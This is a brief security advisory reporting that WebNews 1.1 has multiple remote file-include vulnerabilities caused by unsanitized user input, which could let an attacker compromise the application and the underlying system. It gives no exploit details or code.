WebNews is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied input.

Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.

WebNews 1.1 is vulnerable; other versions may also be affected.
